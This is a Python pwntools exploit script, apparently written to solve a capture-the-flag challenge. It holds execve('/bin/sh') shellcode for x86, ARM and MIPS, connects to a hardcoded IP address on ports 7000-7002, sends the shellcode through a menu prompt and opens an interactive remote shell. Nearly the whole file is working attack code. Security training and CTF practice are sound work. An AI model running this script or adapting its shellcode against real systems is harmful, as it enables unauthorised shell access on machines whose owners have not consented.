#!/usr/bin/env python

from pwn import *

import socket
import re
import binascii
import time

def p32(addr):
	return struct.pack('<L', addr)
def p64(addr):
	return struct.pack('<Q', addr)
def i32(data):
	return int(struct.unpack('<I', data)[0])
def libc(offset):
	return struct.pack('<I', libc_base + offset)
def flat(data):
	return ''.join(data)

def x86_payload():
	payload =  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
	return payload

def arm_payload():
	payload = "\x01\x30\x8f\xe2"
	payload += "\x13\xff\x2f\xe1"
	payload += "\x78\x46\x0e\x30"
	payload += "\x01\x90\x49\x1a"
	payload += "\x92\x1a\x08\x27"
	payload += "\xc2\x51\x03\x37"
	payload += "\x01\xdf\x2f\x62"
	payload += "\x69\x6e\x2f\x2f"
	payload += "\x73\x68"
	return payload

def mips_payload():
	payload =    "\x28\x06\xff\xff"        #/* slti    a2,zero,-1   */
	payload +=    "\x3c\x0f\x2f\x2f"        #/* lui     t7,0x2f2f    */
	payload +=    "\x35\xef\x62\x69"        #/* ori     t7,t7,0x6269 */
	payload +=    "\xaf\xaf\xff\xf4"        #/* sw      t7,-12(sp)   */
	payload +=    "\x3c\x0e\x6e\x2f"        #/* lui     t6,0x6e2f    */
	payload +=    "\x35\xce\x73\x68"        #/* ori     t6,t6,0x7368 */
	payload +=    "\xaf\xae\xff\xf8"        #/* sw      t6,-8(sp)    */
	payload +=    "\xaf\xa0\xff\xfc"        #/* sw      zero,-4(sp)  */
	payload +=    "\x27\xa4\xff\xf4"        #/* addiu   a0,sp,-12    */
	payload +=    "\x28\x05\xff\xff"        #/* slti    a1,zero,-1   */
	payload +=    "\x24\x02\x0f\xab"        #/* li      v0,4011      */
	payload +=    "\x01\x01\x01\x0c"        #/* syscall 0x40404      */
	return payload

def pwn(chall_ip, port, type, magic=False):
	global r
	r = remote(chall_ip, port)

	print r.readuntil('>')
	r.sendline('1')
	print r.readuntil(':')

	payload = ""
	if type == 1:
		payload = x86_payload()
	if type == 2:
		payload = arm_payload()       
	if type == 3:
		payload = mips_payload() 

	r.sendline(payload)
	r.interactive()

context(arch='i386', bits=32, os='linux')

#target_bin = ELF('./chall')
# actaully targeting strlen
#got_target = target_bin.got['exit']

#pwn('52.30.206.11', 7000, 1)
pwn('52.30.206.11', 7001, 2)
#pwn('52.30.206.11', 7002, 3)
